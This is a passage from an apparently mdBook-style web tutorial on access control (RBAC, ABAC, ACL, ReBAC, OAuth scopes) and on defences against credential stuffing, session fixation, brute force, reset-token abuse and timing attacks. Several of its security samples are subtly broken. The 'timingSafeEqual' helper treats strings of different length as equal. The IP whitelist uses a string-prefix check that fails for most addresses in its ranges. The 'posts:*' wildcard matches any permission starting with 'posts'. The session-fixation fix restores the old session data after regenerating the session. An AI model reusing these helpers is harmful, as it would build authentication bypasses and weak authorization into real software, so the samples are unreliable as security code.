      if (permission === requiredPermission) return true;

      // Wildcard match (e.g., "posts:*" matches "posts:read")
      if (permission.endsWith(':*')) {
        const prefix = permission.slice(0, -2);
        return requiredPermission.startsWith(prefix);
      }

      return false;
    });
  }
}

// Usage
const rbac = new RBACService();
const user = { roles: ['editor'] };

console.log(rbac.hasPermission(user, 'posts:write')); // true
console.log(rbac.hasPermission(user, 'users:delete')); // false
</code></pre>
<p><strong>Express Middleware for RBAC:</strong></p>
<pre><code class="language-javascript">function requireRole(...allowedRoles) {
  return (req, res, next) =&gt; {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    const hasRole = req.user.roles.some(role =&gt;
      allowedRoles.includes(role)
    );

    if (!hasRole) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }

    next();
  };
}

function requirePermission(...requiredPermissions) {
  return (req, res, next) =&gt; {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    const rbac = new RBACService();
    const hasPermission = requiredPermissions.every(permission =&gt;
      rbac.hasPermission(req.user, permission)
    );

    if (!hasPermission) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }

    next();
  };
}

// Routes
app.get('/admin/users', requireRole('admin'), (req, res) =&gt; {
  res.json({ users: [] });
});

app.delete('/posts/:id', requirePermission('posts:delete'), (req, res) =&gt; {
  res.json({ success: true });
});
</code></pre>
<h3 id="attribute-based-access-control-abac"><a class="header" href="#attribute-based-access-control-abac">Attribute-Based Access Control (ABAC)</a></h3>
<p>Permissions based on attributes of the user, resource, action, and environment.</p>
<pre><code class="language-javascript">class ABACService {
  // Define policies
  static policies = [
    {
      name: 'Allow owner to edit their posts',
      effect: 'allow',
      condition: (context) =&gt; {
        return context.user.id === context.resource.ownerId &amp;&amp;
               context.action === 'edit';
      }
    },
    {
      name: 'Allow managers to edit posts in their department',
      effect: 'allow',
      condition: (context) =&gt; {
        return context.user.role === 'manager' &amp;&amp;
               context.user.department === context.resource.department &amp;&amp;
               context.action === 'edit';
      }
    },
    {
      name: 'Block editing during maintenance',
      effect: 'deny',
      condition: (context) =&gt; {
        return context.environment.maintenanceMode &amp;&amp;
               ['edit', 'delete'].includes(context.action);
      }
    },
    {
      name: 'Allow reading published posts',
      effect: 'allow',
      condition: (context) =&gt; {
        return context.resource.status === 'published' &amp;&amp;
               context.action === 'read';
      }
    }
  ];

  // Evaluate access
  static evaluateAccess(context) {
    let decision = 'deny'; // Default deny

    for (const policy of this.policies) {
      if (policy.condition(context)) {
        if (policy.effect === 'deny') {
          return 'deny'; // Explicit deny overrides allows
        }
        decision = 'allow';
      }
    }

    return decision;
  }

  // Check if user can perform action
  static canAccess(user, resource, action, environment = {}) {
    const context = { user, resource, action, environment };
    return this.evaluateAccess(context) === 'allow';
  }
}

// Usage
const user = {
  id: 123,
  role: 'manager',
  department: 'engineering'
};

const post = {
  id: 456,
  ownerId: 789,
  department: 'engineering',
  status: 'published'
};

const canEdit = ABACService.canAccess(user, post, 'edit');
console.log(canEdit); // true (manager in same department)

// With environment context
const canEditDuringMaintenance = ABACService.canAccess(
  user,
  post,
  'edit',
  { maintenanceMode: true }
);
console.log(canEditDuringMaintenance); // false (maintenance block)
</code></pre>
<p><strong>Complex ABAC Policy Engine:</strong></p>
<pre><code class="language-javascript">class PolicyEngine {
  constructor() {
    this.policies = [];
  }

  addPolicy(policy) {
    this.policies.push(policy);
  }

  evaluate(request) {
    const { subject, resource, action, context } = request;

    // Check all policies
    const results = this.policies.map(policy =&gt; ({
      policy: policy.name,
      effect: policy.evaluate(subject, resource, action, context)
    }));

    // Deny if any policy explicitly denies
    if (results.some(r =&gt; r.effect === 'deny')) {
      return { decision: 'deny', reason: 'Explicit deny' };
    }

    // Allow if at least one policy allows
    if (results.some(r =&gt; r.effect === 'allow')) {
      return { decision: 'allow' };
    }

    // Default deny
    return { decision: 'deny', reason: 'No matching allow policy' };
  }
}

// Define complex policies
const ownerPolicy = {
  name: 'resource-owner',
  evaluate: (subject, resource, action) =&gt; {
    if (subject.id === resource.ownerId) {
      return 'allow';
    }
    return 'neutral';
  }
};

const timePolicy = {
  name: 'business-hours',
  evaluate: (subject, resource, action, context) =&gt; {
    const hour = new Date().getHours();
    if (hour &lt; 9 || hour &gt; 17) {
      return 'deny';
    }
    return 'neutral';
  }
};

const ipPolicy = {
  name: 'ip-whitelist',
  evaluate: (subject, resource, action, context) =&gt; {
    const allowedIPs = ['192.168.1.0/24', '10.0.0.0/8'];
    if (allowedIPs.some(ip =&gt; context.ipAddress.startsWith(ip.split('/')[0]))) {
      return 'allow';
    }
    return 'neutral';
  }
};

// Use policy engine
const engine = new PolicyEngine();
engine.addPolicy(ownerPolicy);
engine.addPolicy(timePolicy);
engine.addPolicy(ipPolicy);

const decision = engine.evaluate({
  subject: { id: 123, role: 'user' },
  resource: { id: 456, ownerId: 123 },
  action: 'edit',
  context: { ipAddress: '192.168.1.100' }
});
</code></pre>
<h3 id="access-control-lists-acl"><a class="header" href="#access-control-lists-acl">Access Control Lists (ACL)</a></h3>
<p>Direct mapping of users/groups to resource permissions.</p>
<pre><code class="language-javascript">class ACLService {
  constructor() {
    // ACL storage: resource -&gt; user -&gt; permissions
    this.acls = new Map();
  }

  // Grant permission
  grant(resourceId, userId, permission) {
    if (!this.acls.has(resourceId)) {
      this.acls.set(resourceId, new Map());
    }

    const resourceACL = this.acls.get(resourceId);
    if (!resourceACL.has(userId)) {
      resourceACL.set(userId, new Set());
    }

    resourceACL.get(userId).add(permission);
  }

  // Revoke permission
  revoke(resourceId, userId, permission) {
    const resourceACL = this.acls.get(resourceId);
    if (resourceACL?.has(userId)) {
      resourceACL.get(userId).delete(permission);
    }
  }

  // Check permission
  isAllowed(resourceId, userId, permission) {
    const resourceACL = this.acls.get(resourceId);
    if (!resourceACL) return false;

    const userPermissions = resourceACL.get(userId);
    if (!userPermissions) return false;

    return userPermissions.has(permission) ||
           userPermissions.has('*'); // Wildcard
  }

  // Get all permissions for user on resource
  getPermissions(resourceId, userId) {
    const resourceACL = this.acls.get(resourceId);
    return Array.from(resourceACL?.get(userId) || []);
  }

  // Get all users with access to resource
  getUsers(resourceId) {
    const resourceACL = this.acls.get(resourceId);
    if (!resourceACL) return [];

    return Array.from(resourceACL.keys());
  }
}

// Usage
const acl = new ACLService();

// Grant permissions
acl.grant('document:123', 'user:alice', 'read');
acl.grant('document:123', 'user:alice', 'write');
acl.grant('document:123', 'user:bob', 'read');

// Check permissions
console.log(acl.isAllowed('document:123', 'user:alice', 'write')); // true
console.log(acl.isAllowed('document:123', 'user:bob', 'write')); // false

// Revoke permission
acl.revoke('document:123', 'user:alice', 'write');
</code></pre>
<p><strong>Database Schema for ACL:</strong></p>
<pre><code class="language-sql">CREATE TABLE acl_entries (
  id SERIAL PRIMARY KEY,
  resource_type VARCHAR(50) NOT NULL,
  resource_id VARCHAR(255) NOT NULL,
  principal_type VARCHAR(50) NOT NULL, -- 'user' or 'group'
  principal_id VARCHAR(255) NOT NULL,
  permission VARCHAR(100) NOT NULL,
  granted BOOLEAN DEFAULT true,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  UNIQUE(resource_type, resource_id, principal_type, principal_id, permission)
);

CREATE INDEX idx_acl_resource ON acl_entries(resource_type, resource_id);
CREATE INDEX idx_acl_principal ON acl_entries(principal_type, principal_id);
</code></pre>
<h3 id="relationship-based-access-control-rebac"><a class="header" href="#relationship-based-access-control-rebac">Relationship-Based Access Control (ReBAC)</a></h3>
<p>Authorization based on relationships between users and resources (e.g., “owner”, “collaborator”, “follower”).</p>
<pre><code class="language-javascript">class ReBAC {
  constructor() {
    // Store relationships: subject -&gt; relation -&gt; object
    this.relationships = new Map();
  }

  // Add relationship
  addRelation(subject, relation, object) {
    const key = `${subject}:${relation}`;
    if (!this.relationships.has(key)) {
      this.relationships.set(key, new Set());
    }
    this.relationships.get(key).add(object);
  }

  // Check relationship
  hasRelation(subject, relation, object) {
    const key = `${subject}:${relation}`;
    return this.relationships.get(key)?.has(object) || false;
  }

  // Check if user can perform action
  can(user, action, resource) {
    // Define rules
    const rules = {
      'read': ['owner', 'collaborator', 'viewer'],
      'write': ['owner', 'collaborator'],
      'delete': ['owner'],
      'share': ['owner']
    };

    const requiredRelations = rules[action];
    if (!requiredRelations) return false;

    return requiredRelations.some(relation =&gt;
      this.hasRelation(user, relation, resource)
    );
  }

  // Get all objects user has relation with
  getRelated(subject, relation) {
    const key = `${subject}:${relation}`;
    return Array.from(this.relationships.get(key) || []);
  }
}

// Usage
const rebac = new ReBAC();

// Define relationships
rebac.addRelation('user:alice', 'owner', 'doc:123');
rebac.addRelation('user:bob', 'collaborator', 'doc:123');
rebac.addRelation('user:charlie', 'viewer', 'doc:123');

// Check permissions
console.log(rebac.can('user:alice', 'delete', 'doc:123')); // true
console.log(rebac.can('user:bob', 'write', 'doc:123')); // true
console.log(rebac.can('user:charlie', 'write', 'doc:123')); // false
</code></pre>
<h3 id="oauth-20-scopes"><a class="header" href="#oauth-20-scopes">OAuth 2.0 Scopes</a></h3>
<p>OAuth uses scopes for fine-grained authorization.</p>
<pre><code class="language-javascript">class ScopeAuthorization {
  // Define scope hierarchy
  static scopeHierarchy = {
    'admin': ['read', 'write', 'delete'],
    'write': ['read'],
    'read': []
  };

  // Check if token has required scope
  static hasScope(tokenScopes, requiredScope) {
    // Check exact match
    if (tokenScopes.includes(requiredScope)) {
      return true;
    }

    // Check if any token scope includes required scope
    return tokenScopes.some(tokenScope =&gt; {
      const inherited = this.scopeHierarchy[tokenScope] || [];
      return inherited.includes(requiredScope);
    });
  }

  // Middleware
  static requireScope(...requiredScopes) {
    return (req, res, next) =&gt; {
      const token = req.user?.token;
      if (!token) {
        return res.status(401).json({ error: 'No token' });
      }

      const hasAllScopes = requiredScopes.every(scope =&gt;
        this.hasScope(token.scopes, scope)
      );

      if (!hasAllScopes) {
        return res.status(403).json({
          error: 'Insufficient scopes',
          required: requiredScopes,
          provided: token.scopes
        });
      }

      next();
    };
  }
}

// Usage
app.get('/api/data',
  authenticateJWT,
  ScopeAuthorization.requireScope('read'),
  (req, res) =&gt; {
    res.json({ data: [] });
  }
);

app.post('/api/data',
  authenticateJWT,
  ScopeAuthorization.requireScope('write'),
  (req, res) =&gt; {
    res.json({ success: true });
  }
);
</code></pre>
<h3 id="authorization-best-practices"><a class="header" href="#authorization-best-practices">Authorization Best Practices</a></h3>
<pre><code class="language-javascript">// 1. Principle of Least Privilege
// Grant minimal permissions needed
const minimalPermissions = ['posts:read'];
const excessivePermissions = ['posts:*', 'users:*', 'settings:*']; // ❌

// 2. Deny by Default
function checkAccess(user, resource, action) {
  // Default deny
  let allowed = false;

  // Explicit checks
  if (user.isOwner(resource)) allowed = true;
  if (user.hasPermission(action)) allowed = true;

  return allowed;
}

// 3. Centralized Authorization
class AuthorizationService {
  static async authorize(user, action, resource) {
    // Single point for all authorization logic
    const policies = await this.loadPolicies();
    return this.evaluate(policies, user, action, resource);
  }
}

// 4. Audit Authorization Decisions
async function authorizeWithAudit(user, action, resource) {
  const decision = await authorize(user, action, resource);

  await auditLog.record({
    timestamp: new Date(),
    userId: user.id,
    action,
    resource,
    decision,
    reason: decision.reason
  });

  return decision;
}

// 5. Separate Authorization from Business Logic
// ❌ Bad
app.post('/posts/:id/delete', async (req, res) =&gt; {
  const post = await Post.findById(req.params.id);
  if (req.user.id !== post.ownerId &amp;&amp; !req.user.roles.includes('admin')) {
    return res.status(403).send('Forbidden');
  }
  await post.delete();
});

// ✅ Good
app.post('/posts/:id/delete',
  authorize('posts:delete'),
  async (req, res) =&gt; {
    const post = await Post.findById(req.params.id);
    await post.delete();
  }
);
</code></pre>
<hr>
<h2 id="security-best-practices"><a class="header" href="#security-best-practices">Security Best Practices</a></h2>
<h3 id="1-password-security"><a class="header" href="#1-password-security">1. Password Security</a></h3>
<pre><code class="language-javascript">// Strong password requirements
const PASSWORD_REQUIREMENTS = {
  minLength: 12,
  requireUppercase: true,
  requireLowercase: true,
  requireNumbers: true,
  requireSpecialChars: true,
  preventCommonPasswords: true,
  preventUserInfo: true  // Don't allow username in password
};

// Password hashing
const BCRYPT_ROUNDS = 12; // or use Argon2
</code></pre>
<h3 id="2-account-lockout"><a class="header" href="#2-account-lockout">2. Account Lockout</a></h3>
<pre><code class="language-javascript">class AccountLockoutService {
  static async recordFailedAttempt(username) {
    const key = `lockout:${username}`;
    const attempts = await redis.incr(key);
    await redis.expire(key, 900); // 15 minutes

    if (attempts &gt;= 5) {
      await this.lockAccount(username);
    }

    return attempts;
  }

  static async lockAccount(username) {
    await db.users.update(
      { username },
      {
        locked: true,
        lockedUntil: new Date(Date.now() + 30 * 60 * 1000) // 30 min
      }
    );
  }

  static async checkLocked(username) {
    const user = await db.users.findOne({ username });

    if (user.locked &amp;&amp; user.lockedUntil &gt; new Date()) {
      return true;
    }

    // Auto-unlock
    if (user.locked &amp;&amp; user.lockedUntil &lt;= new Date()) {
      await db.users.update(
        { username },
        { locked: false, lockedUntil: null }
      );
    }

    return false;
  }
}
</code></pre>
<h3 id="3-secure-session-configuration"><a class="header" href="#3-secure-session-configuration">3. Secure Session Configuration</a></h3>
<pre><code class="language-javascript">const sessionConfig = {
  // Use secure cookie settings
  cookie: {
    secure: true,           // HTTPS only
    httpOnly: true,         // Prevent XSS
    sameSite: 'strict',     // CSRF protection
    maxAge: 3600000,        // 1 hour
    domain: '.myapp.com'    // Explicit domain
  },

  // Session security
  secret: process.env.SESSION_SECRET, // Strong random secret
  resave: false,
  saveUninitialized: false,
  rolling: true,            // Reset expiry on activity

  // Use secure storage
  store: new RedisStore({
    client: redisClient,
    prefix: 'sess:',
    ttl: 3600
  })
};
</code></pre>
<h3 id="4-token-security"><a class="header" href="#4-token-security">4. Token Security</a></h3>
<pre><code class="language-javascript">// JWT best practices
const JWT_CONFIG = {
  // Short-lived access tokens
  accessTokenExpiry: '15m',

  // Longer-lived refresh tokens
  refreshTokenExpiry: '7d',

  // Strong secrets
  accessTokenSecret: process.env.JWT_SECRET,  // 256-bit+
  refreshTokenSecret: process.env.JWT_REFRESH_SECRET,

  // Algorithm
  algorithm: 'RS256',  // Use asymmetric when possible

  // Claims
  issuer: 'myapp.com',
  audience: 'myapp-api'
};

// Token rotation
async function rotateRefreshToken(oldToken) {
  // Verify old token
  const payload = jwt.verify(oldToken, JWT_CONFIG.refreshTokenSecret);

  // Revoke old token
  await redis.setex(`revoked:${oldToken}`, 604800, '1');

  // Issue new token
  return generateRefreshToken(payload.userId);
}
</code></pre>
<h3 id="5-rate-limiting"><a class="header" href="#5-rate-limiting">5. Rate Limiting</a></h3>
<pre><code class="language-javascript">const rateLimit = require('express-rate-limit');

// Login rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true
});

// API rate limiting
const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // 100 requests per minute
  keyGenerator: (req) =&gt; req.user?.id || req.ip
});

app.post('/login', loginLimiter, loginHandler);
app.use('/api', apiLimiter);
</code></pre>
<h3 id="6-audit-logging"><a class="header" href="#6-audit-logging">6. Audit Logging</a></h3>
<pre><code class="language-javascript">class AuditLogger {
  static async logAuthEvent(event, userId, details) {
    await db.auditLogs.create({
      timestamp: new Date(),
      event,
      userId,
      ip: details.ip,
      userAgent: details.userAgent,
      success: details.success,
      metadata: details.metadata
    });
  }

  // Log events
  static async logLogin(userId, req, success) {
    await this.logAuthEvent('LOGIN', userId, {
      ip: req.ip,
      userAgent: req.get('user-agent'),
      success
    });
  }

  static async logPasswordChange(userId, req) {
    await this.logAuthEvent('PASSWORD_CHANGE', userId, {
      ip: req.ip,
      userAgent: req.get('user-agent'),
      success: true
    });
  }

  static async log2FAEnabled(userId, req) {
    await this.logAuthEvent('2FA_ENABLED', userId, {
      ip: req.ip,
      userAgent: req.get('user-agent'),
      success: true
    });
  }
}
</code></pre>
<hr>
<h2 id="common-vulnerabilities"><a class="header" href="#common-vulnerabilities">Common Vulnerabilities</a></h2>
<h3 id="1-credential-stuffing"><a class="header" href="#1-credential-stuffing">1. Credential Stuffing</a></h3>
<p><strong>Attack:</strong> Automated login attempts using leaked credentials</p>
<p><strong>Mitigation:</strong></p>
<pre><code class="language-javascript">// Implement CAPTCHA after failed attempts
async function checkCaptcha(req) {
  const attempts = await redis.get(`login:attempts:${req.ip}`);

  if (attempts &amp;&amp; attempts &gt; 3) {
    if (!req.body.captcha) {
      throw new Error('CAPTCHA required');
    }

    const isValid = await verifyCaptcha(req.body.captcha);
    if (!isValid) {
      throw new Error('Invalid CAPTCHA');
    }
  }
}

// Device fingerprinting
async function checkDeviceFingerprint(userId, fingerprint) {
  const knownDevices = await db.devices.find({ userId });

  if (!knownDevices.some(d =&gt; d.fingerprint === fingerprint)) {
    // New device - require additional verification
    await sendVerificationEmail(userId);
    return false;
  }

  return true;
}
</code></pre>
<h3 id="2-session-fixation"><a class="header" href="#2-session-fixation">2. Session Fixation</a></h3>
<p><strong>Attack:</strong> Attacker sets user’s session ID</p>
<p><strong>Mitigation:</strong></p>
<pre><code class="language-javascript">// Regenerate session ID after login
app.post('/login', async (req, res) =&gt; {
  // ... authenticate user ...

  // Regenerate session
  const oldSessionData = req.session;
  req.session.regenerate((err) =&gt; {
    if (err) {
      return res.status(500).send('Login failed');
    }

    // Restore data
    Object.assign(req.session, oldSessionData);
    req.session.userId = user.id;

    res.json({ success: true });
  });
});
</code></pre>
<h3 id="3-brute-force-attacks"><a class="header" href="#3-brute-force-attacks">3. Brute Force Attacks</a></h3>
<p><strong>Attack:</strong> Trying many password combinations</p>
<p><strong>Mitigation:</strong></p>
<pre><code class="language-javascript">class BruteForceProtection {
  static async checkAttempts(identifier) {
    const key = `brute:${identifier}`;
    const attempts = await redis.get(key) || 0;

    if (attempts &gt;= 10) {
      const ttl = await redis.ttl(key);
      throw new Error(`Too many attempts. Try again in ${ttl} seconds`);
    }

    return parseInt(attempts);
  }

  static async recordAttempt(identifier, success) {
    const key = `brute:${identifier}`;

    if (success) {
      await redis.del(key);
    } else {
      const attempts = await redis.incr(key);

      // Exponential backoff
      if (attempts === 1) {
        await redis.expire(key, 60); // 1 minute
      } else if (attempts === 5) {
        await redis.expire(key, 300); // 5 minutes
      } else if (attempts &gt;= 10) {
        await redis.expire(key, 3600); // 1 hour
      }
    }
  }
}
</code></pre>
<h3 id="4-password-reset-vulnerabilities"><a class="header" href="#4-password-reset-vulnerabilities">4. Password Reset Vulnerabilities</a></h3>
<p><strong>Attack:</strong> Token prediction, token reuse, no expiration</p>
<p><strong>Mitigation:</strong></p>
<pre><code class="language-javascript">class SecurePasswordReset {
  static async createResetToken(email) {
    const user = await db.users.findOne({ email });
    if (!user) {
      // Don't reveal if user exists
      return null;
    }

    // Cryptographically secure token
    const token = crypto.randomBytes(32).toString('hex');

    // Hash token before storage
    const hash = crypto.createHash('sha256').update(token).digest('hex');

    // Invalidate previous tokens
    await db.passwordResets.deleteMany({ userId: user.id });

    // Store with expiration
    await db.passwordResets.create({
      userId: user.id,
      tokenHash: hash,
      expires: new Date(Date.now() + 3600000), // 1 hour
      used: false
    });

    return token;
  }

  static async verifyResetToken(token) {
    const hash = crypto.createHash('sha256').update(token).digest('hex');

    const reset = await db.passwordResets.findOne({
      tokenHash: hash,
      expires: { $gt: new Date() },
      used: false
    });

    if (!reset) {
      throw new Error('Invalid or expired token');
    }

    return reset;
  }

  static async resetPassword(token, newPassword) {
    const reset = await this.verifyResetToken(token);

    // Hash new password
    const hashedPassword = await hashPassword(newPassword);

    // Update password
    await db.users.update(
      { id: reset.userId },
      { password: hashedPassword }
    );

    // Mark token as used
    await db.passwordResets.update(
      { id: reset.id },
      { used: true }
    );

    // Invalidate all sessions
    await db.sessions.deleteMany({ userId: reset.userId });

    return true;
  }
}
</code></pre>
<h3 id="5-timing-attacks"><a class="header" href="#5-timing-attacks">5. Timing Attacks</a></h3>
<p><strong>Attack:</strong> Measuring response time to gain information</p>
<p><strong>Mitigation:</strong></p>
<pre><code class="language-javascript">const crypto = require('crypto');

// Constant-time string comparison
function timingSafeEqual(a, b) {
  if (a.length !== b.length) {
    // Still compare to prevent timing leak
    b = a;
  }

  return crypto.timingSafeEqual(
    Buffer.from(a),
    Buffer.from(b)
  );
}

// Constant-time user lookup and password check
async function authenticateUser(username, password) {
  // Always perform lookup
  const user = await db.users.findOne({ username }) || {
    password: await bcrypt.hash('dummy', 12)
  };

  // Always perform comparison
  const isValid = await bcrypt.compare(password, user.password);

  if (!user.id || !isValid) {
    throw new Error('Invalid credentials');
  }

  return user;
}
</code></pre>
<hr>
<h2 id="resources"><a class="header" href="#resources">Resources</a></h2>
<p><strong>Specifications &amp; Standards:</strong></p>
<ul>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html">OWASP Authentication Cheat Sheet</a></li>
<li><a href="https://pages.nist.gov/800-63-3/">NIST Digital Identity Guidelines</a></li>
<li><a href="https://tools.ietf.org/html/rfc6749">OAuth 2.0 RFC 6749</a></li>
<li><a href="https://openid.net/specs/openid-connect-core-1_0.html">OpenID Connect Core</a></li>
<li><a href="https://www.w3.org/TR/webauthn/">WebAuthn W3C Recommendation</a></li>
</ul>
<p><strong>Security Guidelines:</strong></p>
<ul>
<li><a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a></li>
<li><a href="https://cwe.mitre.org/top25/">CWE/SANS Top 25</a></li>
<li><a href="https://infosec.mozilla.org/guidelines/web_security">Mozilla Web Security</a></li>
</ul>
<p><strong>Tools &amp; Libraries:</strong></p>
<ul>
<li><a href="http://www.passportjs.org/">Passport.js</a> - Authentication middleware</li>
<li><a href="https://github.com/kelektiv/node.bcrypt.js">bcrypt</a> - Password hashing</li>
<li><a href="https://github.com/auth0/node-jsonwebtoken">jsonwebtoken</a> - JWT implementation</li>
<li><a href="https://github.com/speakeasyjs/speakeasy">speakeasy</a> - TOTP/HOTP</li>
<li><a href="https://simplewebauthn.dev/">@simplewebauthn/server</a> - WebAuthn</li>
</ul>
<p><strong>Learning Resources:</strong></p>
<ul>
<li><a href="https://auth0.com/blog/">Auth0 Blog</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/README">OWASP Authentication Guide</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../security/jwt.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                            </a>

                            <a rel="next prefetch" href="../wifi/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../security/jwt.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                    </a>

                    <a rel="next prefetch" href="../wifi/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                    </a>
            </nav>

        </div>

        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
